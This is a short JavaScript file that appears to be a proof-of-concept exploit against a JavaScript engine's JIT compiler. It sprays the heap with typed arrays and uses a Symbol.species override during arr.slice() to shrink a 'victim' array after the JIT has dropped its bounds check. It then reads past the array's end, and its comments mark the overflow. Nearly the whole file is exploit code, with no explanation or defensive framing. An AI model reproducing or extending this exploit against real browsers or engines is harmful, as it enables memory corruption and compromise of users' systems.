let size = 0x100;

garr = [];
j = 0;
function gc(){
	var tmp = [];
	for(let i = 0;i < 0x20000;i++){
		tmp[i] = new Uint32Array(size * 2);
		for(let j = 0;j < (size*2);j+=2){
			tmp[i][j] = 0x12345678;
			tmp[i][j+1] = 0xfffe0123;
		}
	}
	garr[j++] = tmp;
}

let arr = [{},0x49505049];

let obj = {};

obj[Symbol.species] = function(){
	console.log("inside obj");
	victim.length = 0x20; // length of victim should be 0x20
	for (let k = 0; k<0x20; k++){
		victim[k] = 0x44454544;
	}
	console.log(victim.length);
	for(let i = 0;i < 0x2000;i++){
		gvictim[i].length = 0x0;
		gvictim[i] = null;
	}
	gc();
	return [0x45464645];
}

let gvictim = [];

for(let i = 0;i < 0x1000;i++){
	gvictim[i] = [1.1,2.2];
	gvictim[i].length = size;
	gvictim[i].fill(3.3);
}

let victim = [0x46474746,0x47484847];
victim.length = size;
victim.fill(0x48494948);

for(let i = 0x1000;i < 0x2000;i++){
	gvictim[i] = [1.1,2.2];
	gvictim[i].length = size;
	gvictim[i].fill(3.3);
}

function fake(arg){
}
for(let i = 0;i < size;i++){
	fake["x"+i.toString()] = 2.2;
}

function jit(){
	victim[1] = 0x45464645;
	arr.slice();
	// lengt of victim was changed to 0x20
	// but bound check ommited
	return victim[0x21]; // overflow
}

flag = 0;


for(let i = 0;i < 0x10000;i++){
	xx = jit();
}

Math.cos(1);
console.log("pwn");
arr.constructor = obj;
Array.isArray(victim);
res = jit();
console.log(res)
Math.cos(1);